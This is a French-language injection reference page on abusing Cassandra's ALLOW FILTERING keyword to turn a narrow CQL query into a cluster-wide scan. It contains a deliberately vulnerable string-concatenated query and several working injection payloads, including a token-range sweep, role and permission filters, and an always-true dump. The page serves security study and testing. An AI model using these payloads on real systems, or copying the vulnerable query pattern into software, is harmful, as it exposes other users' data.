---
order: 4
title: "Abus d'ALLOW FILTERING : forcer des scans CQL sur tout le cluster"
description: "Ajouter ALLOW FILTERING à une requête CQL injectée supprime la restriction de clé de partition, permettant à un attaquant de scanner chaque nœud et de lire des lignes au-delà de la partition prévue."
keywords:
  - ALLOW FILTERING
  - full table scan
  - contournement de clé de partition
  - injection CQL
  - exposition de données Cassandra
---

# Abus d'ALLOW FILTERING

Cassandra se protège en rejetant toute requête dont le `WHERE` ne contraint pas la clé de partition, ou qui filtre sur une colonne non clé, parce qu'une telle requête ne peut pas être servie depuis une seule partition et doit au contraire toucher chaque nœud. La porte de sortie est le mot-clé `ALLOW FILTERING`, qui indique au coordinateur d'exécuter quand même ce scan coûteux. Injecté dans une requête construite par chaînes de caractères, il convertit une recherche étroite sur une partition en une lecture à l'échelle du cluster.

## Pourquoi cela compte pour l'injection

Une application restreint habituellement une requête à une seule partition que l'utilisateur courant est autorisé à voir :

```python
q = "SELECT * FROM messages WHERE account_id = '" + acct + "' AND box = '" + box + "'"
```

Les deux prédicats portent sur des colonnes clés, donc la requête est peu coûteuse et étroitement restreinte. Sans `ALLOW FILTERING`, un prédicat injecté sur une colonne **non clé** est simplement refusé par le moteur, donc le filtre élargi de l'attaquant ne s'exécute jamais. Ajouter le mot-clé supprime ce refus, et le filtre élargi est évalué contre les lignes de chaque partition de chaque nœud.

## Lire au-delà de la partition

Étant donné le point d'injection ci-dessus, une valeur `box` de :

```sql
inbox' AND priority = 'high' ALLOW FILTERING /*
```

produit :

```sql
SELECT * FROM messages WHERE account_id = '...' AND box = 'inbox'
AND priority = 'high' ALLOW FILTERING
```

Le prédicat ajouté est une égalité sur une colonne scalaire non clé, que CQL refuse sans `ALLOW FILTERING`. (`CONTAINS` n'est pas une option ici : il teste l'appartenance à une colonne collection, pas une sous-chaîne d'une colonne `text`. La correspondance de sous-chaîne nécessite `LIKE` contre une colonne indexée par SASI, couverte dans l'[extraction en aveugle](blind.md).)

Scanner au-delà d'une seule partition nécessite un point d'injection où aucune égalité fixe sur la clé de partition ne précède l'injection, car `ALLOW FILTERING` ne supprime pas un prédicat `account_id = '...'` existant (cette égalité épingle toujours la requête à une seule partition). Le cas qui fonctionne est une requête ne filtrant que sur la colonne non clé injectée, comme un endpoint d'administration ou de recherche `SELECT * FROM messages WHERE status = '<inj>'`, où une plage `token()` balaie alors tout l'anneau du partitionneur :

```sql
x' AND token(account_id) >= -9223372036854775808 ALLOW FILTERING /*
```

La borne est le token minimum du partitionneur Murmur3, donc la plage couvre l'anneau entier ; c'est `ALLOW FILTERING` qui permet réellement le scan multi-partitions. Les prédicats d'égalité sur colonne non clé et d'appartenance à une collection sélectionnent ensuite les lignes d'intérêt :

```sql
x' AND role = 'admin' ALLOW FILTERING /*
x' AND permissions CONTAINS 'billing' ALLOW FILTERING /*
```

## Combinaison avec IN et plages

`ALLOW FILTERING` se combine avec les opérateurs que CQL autorise, permettant à une seule instruction de balayer un vaste espace de valeurs :

```sql
' AND status IN ('active','locked','pending') ALLOW FILTERING /*
' AND age >= 0 ALLOW FILTERING /*
```

Le second payload, avec une plage toujours vraie sur une colonne numérique non clé, renvoie chaque ligne que le moteur peut atteindre, l'équivalent CQL le plus proche d'un dump `1=1`, et dépend entièrement d'`ALLOW FILTERING` pour être accepté.

## Placement

Le mot-clé doit venir après les prédicats du `WHERE` et avant tout `LIMIT` que le moteur applique. Un commentaire de bloc `/*` final écarte le reste de l'instruction originale pour qu'un `LIMIT` ou un `ALLOW FILTERING` parasite issu du gabarit ne casse pas l'analyse :

```sql
' AND role = 'admin' ALLOW FILTERING /*
```

Lorsque la sortie n'est pas renvoyée, les mêmes prédicats de scan complet pilotent l'inférence par comptage de lignes dans [Inférence en aveugle](blind.md).

## Outils

- **cqlsh** : valider les payloads ALLOW FILTERING et de plage de tokens directement contre le cluster.
- **Burp Repeater** : délivrer le prédicat élargi via le paramètre web.

## Références

- [Apache Cassandra: ALLOW FILTERING](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/dml.html#allow-filtering)
- [Apache Cassandra: SELECT](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/dml.html#select-statement)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
